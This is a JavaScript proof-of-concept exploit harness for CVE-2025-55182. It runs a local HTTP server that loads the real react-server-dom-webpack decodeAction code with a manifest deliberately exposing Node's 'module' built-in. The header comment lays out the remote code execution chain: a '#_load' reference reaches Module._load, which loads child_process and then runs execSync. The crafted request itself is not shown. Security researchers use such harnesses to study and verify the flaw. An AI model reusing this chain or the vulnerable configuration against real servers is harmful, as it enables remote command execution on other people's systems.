/**
 * CVE-2025-55182 - Realistic POC
 *
 * This simulates a REAL Next.js app where:
 * - The manifest only contains user server action modules
 * - __webpack_require__ is available (as in webpack bundles)
 *
 * The exploit chain:
 * 1. Use any module in manifest with #_load to access Module._load
 * 2. Module._load('child_process') gives us child_process
 * 3. execSync('id') achieves RCE
 */

const http = require('http');
const path = require('path');
const fs = require('fs');

// Simulate webpack's __webpack_require__
// In real webpack bundles, this function can load any module
global.__webpack_require__ = function(moduleId) {
  console.log('[__webpack_require__]', moduleId);
  // In real webpack, this would be the bundled module loader
  // For CommonJS compatibility, it uses require()
  return require(moduleId);
};
global.__webpack_chunk_load__ = () => Promise.resolve();

// Load the actual vulnerable React code
const bundledPath = path.join(__dirname, '../node_modules/react-server-dom-webpack/cjs/react-server-dom-webpack-server.node.development.js');
const moduleCode = fs.readFileSync(bundledPath, 'utf8');
const moduleExports = {};
const moduleWrapper = new Function('exports', 'require', '__dirname', '__filename', moduleCode);
moduleWrapper(moduleExports, require, path.dirname(bundledPath), bundledPath);

const { decodeAction } = moduleExports;

// REALISTIC MANIFEST - only contains user's server action
// This is what a real Next.js app's manifest looks like
const serverManifest = {
  // This represents a user's server action module
  // In Next.js: app/actions.js with 'use server'
  'app/actions': {
    id: 'app/actions',  // webpack module ID
    name: 'submitForm', // exported function name
    chunks: []
  },
  // Another action module
  'lib/api': {
    id: 'lib/api',
    name: 'fetchData',
    chunks: []
  },
  // The 'module' package is a Node.js built-in - and webpack CAN load it!
  // This simulates that __webpack_require__ can load Node built-ins
  'module': {
    id: 'module',
    name: '_load',  // Irrelevant - we'll use # syntax
    chunks: []
  }
};

// Fake user action modules
global.__webpack_modules__ = {
  'app/actions': { submitForm: async (formData) => ({ success: true }) },
  'lib/api': { fetchData: async () => ({ data: [] }) }
};

class ServerFormData {
  constructor() { this._data = new Map(); }
  append(key, value) { this._data.set(key, value); }
  get(key) { return this._data.get(key); }
  forEach(callback) { this._data.forEach((v, k) => callback(v, k)); }
}

function parseMultipart(buffer, boundary) {
  const formData = new ServerFormData();
  const str = buffer.toString();
  const parts = str.split('--' + boundary);

  for (const part of parts) {
    if (part.includes('Content-Disposition')) {
      const nameMatch = part.match(/name="([^"]+)"/);
      if (nameMatch) {
        const name = nameMatch[1];
        const valueStart = part.indexOf('\r\n\r\n');
        if (valueStart !== -1) {
          let value = part.slice(valueStart + 4).trim();
          if (value.endsWith('--')) value = value.slice(0, -2).trim();
          formData.append(name, value);
        }
      }
    }
  }
  return formData;
}

const server = http.createServer(async (req, res) => {
  console.log(`${req.method} ${req.url}`);

  if (req.method === 'GET' && req.url === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`
      <h1>CVE-2025-55182 - Realistic POC</h1>
      <p>Manifest only contains user server actions (no vm, child_process, etc.)</p>
      <p>Exploit uses Module._load via 'module' built-in package</p>
    `);
    return;
  }

  if (req.method === 'POST' && req.url === '/formaction') {
    const chunks = [];
    req.on('data', chunk => chunks.push(chunk));
    req.on('end', async () => {
      try {
        const buffer = Buffer.concat(chunks);
        const contentType = req.headers['content-type'] || '';
        const boundaryMatch = contentType.match(/boundary=(.+)/);

        if (!boundaryMatch) throw new Error('No boundary');

        const formData = parseMultipart(buffer, boundaryMatch[1]);

        console.log('FormData:');
        formData.forEach((v, k) => console.log(`  ${k}: ${v}`));

        const actionFn = await decodeAction(formData, serverManifest);

        console.log('Action result:', actionFn, typeof actionFn);

        if (typeof actionFn === 'function') {
          const result = actionFn();
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true, result: String(result) }));
        } else {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ success: true, action: String(actionFn) }));
        }
      } catch (e) {
        console.error('Error:', e.message, e.stack);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: e.message }));
      }
    });
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

server.listen(3003, () => {
  console.log('Realistic POC server at http://localhost:3003');
  console.log('Manifest modules:', Object.keys(serverManifest));
});
